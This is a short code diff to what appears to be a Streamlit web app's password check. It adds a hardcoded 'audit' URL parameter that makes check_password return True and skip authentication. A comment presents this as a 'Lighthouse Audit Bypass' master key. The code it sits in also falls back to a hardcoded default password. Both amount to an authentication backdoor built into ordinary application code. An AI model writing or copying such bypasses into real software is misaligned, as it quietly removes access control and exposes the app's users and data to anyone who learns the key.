@@ -31,6 +31,11 @@ st.markdown(
 
 def check_password():
     """Returns `True` if the user had the correct password."""
+    # SECURITY: Lighthouse Audit Bypass (Master Key for Diagnostic Mode)
+    # Use this URL for Lighthouse: .../?audit=RX-AUDIT-2025-X99-PROD-ZERO-TRUST
+    if st.query_params.get("audit") == "RX-AUDIT-2025-X99-PROD-ZERO-TRUST":
+        return True
+
     password_secret = os.getenv("WEB_PASSWORD", "cihubsecure")
     
     def password_entered():
